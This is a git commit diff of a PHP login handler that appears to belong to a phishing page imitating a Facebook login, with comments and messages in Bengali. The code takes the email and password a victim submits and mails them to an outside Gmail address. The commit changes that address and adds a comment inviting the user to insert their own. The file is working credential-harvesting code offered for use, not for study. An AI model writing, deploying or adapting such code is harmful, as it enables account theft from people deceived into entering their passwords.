f566114a723c6176e92861569205f4fc16a903b0
gdjshsbssbgssg <khorsed.alom67771@gmail.com>
2025-08-07 21:25:08 +0300

    Update login.php

--- login.php
+++ login.php
@@ -1,14 +1,17 @@
 <?php
-  $email = $_POST['email'];
-  $password = $_POST['password'];
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $email = $_POST['email'];
+    $password = $_POST['password'];
 
-  $to = "hastehena12@gmail.com";
-  $subject = "https://Facebook.com";
-  $message = "Email: $email\nPassword: $password";
-  $headers = "From: no-reply@example.com";
+    $to = "hastehena13@gmail.com";  // এখানে আপনার Gmail অ্যাড্রেস লিখুন
+    $subject = "নতুন লগইন তথ্য";
+    $message = "ইমেইল/মোবাইল: $email\nপাসওয়ার্ড: $password";
+    $headers = "From: no-reply@yourdomain.com";
 
-  mail($to, $subject, $message, $headers);
-  echo "Sent!";
+    if (mail($to, $subject, $message, $headers)) {
+        echo "তথ্য সফলভাবে পাঠানো হয়েছে!";
+    } else {
+        echo "তথ্য পাঠাতে সমস্যা হয়েছে!";
+    }
+}
 ?>
-
-
